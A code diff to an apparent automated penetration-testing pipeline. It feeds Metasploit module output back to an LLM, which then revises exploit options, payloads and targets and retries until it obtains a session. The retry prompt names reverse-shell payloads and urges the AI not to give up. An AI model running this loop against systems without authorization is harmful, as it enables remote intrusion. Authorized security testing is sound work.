@@ -546,7 +546,9 @@ class PentestPipeline(PipelineBase):
                     print(f"\n{C_YELLOW}[DEBUG] Tentativa {attempt}/{max_attempts} - Executando {m_type}/{m_name}{C_RESET}")
                     print(f"{C_YELLOW}[DEBUG] Opcoes injetadas pela IA: {opts}{C_RESET}")
                     
-                    self.msf.run_module(m_type, m_name, opts)
+                    mod_output = self.msf.run_module(m_type, m_name, opts) or ""
+                    if mod_output.strip():
+                        print(f"{C_YELLOW}[MSF OUTPUT]\n{mod_output}{C_RESET}")
                     print(f"{C_YELLOW}[DEBUG] Exploit enviado. Aguardando 20s...{C_RESET}")
                     time.sleep(20) 
                     
@@ -568,16 +570,29 @@ class PentestPipeline(PipelineBase):
                         The exploit '{m_name}' failed to create a session on {self.target_ip}.
                         The options used were: {opts}
                         
-                        As an expert, you know some exploits require exact TARGET architectures (e.g., 1=VMware, 2=Hyper-V, 3=Baremetal) or specific PAYLOADs (like reverse_tcp or generic reverse shells).
+                        REAL METASPLOIT OUTPUT (read it and fix the ACTUAL error):
+                        ---
+                        {mod_output[-1500:] if mod_output else "(no output captured)"}
+                        ---
                         
-                        Provide a revised set of options to try again. If you believe changing the TARGET, PAYLOAD, or any other option will work, do so now.
-                        Do NOT give up prematurely: we will exhaust every attempt, so always return your best revised options.
+                        Fix the problem shown above. Common fixes:
+                        - "Unknown datastore option: X. Did you mean Y?" -> put X in
+                          "remove_options" and set the correct option Y in "options".
+                        - "All encoders failed to encode" / payload errors -> change PAYLOAD
+                          (old PHP webapps: try "php/reverse_php" or "generic/shell_reverse_tcp";
+                          cmd targets: "cmd/unix/reverse").
+                        - "No target"/"Invalid target"/"Invalid payload for given target" ->
+                          change TARGET index or align PAYLOAD with TARGET.
+                        - "not vulnerable"/"does not appear" -> path/version wrong; fix
+                          URI/TARGETURI/RPORT.
+                        Use the EXACT option names this module accepts. Do NOT give up early.
                         
                         OUTPUT FORMAT (JSON ONLY):
                         {{
                           "strategy": "exploit_cve",
                           "options": {{"OPT_NAME": "NEW_OPT_VALUE"}},
-                          "reason": "Explain exactly what you changed (e.g., 'Changed TARGET to 2' or 'Added PAYLOAD')."
+                          "remove_options": ["OPT_TO_REMOVE"],
+                          "reason": "Explain exactly what you changed and why (cite the output)."
                         }}
                         """
                         resp = self.ask_llm_robust(retry_prompt)
@@ -591,6 +606,8 @@ class PentestPipeline(PipelineBase):
                                     break
                                 
                                 # ATUALIZA COM NOVA SUGESTÃO
+                                for _rk in (new_plan.get("remove_options") or []):
+                                    opts.pop(_rk, None)
                                 new_opts = new_plan.get("options", {})
                                 opts.update(new_opts) 
                                 print(f"{C_BLUE}[AI AUTO-CORRECTION] {new_plan.get('reason', 'Parametros ajustados.')}{C_RESET}")
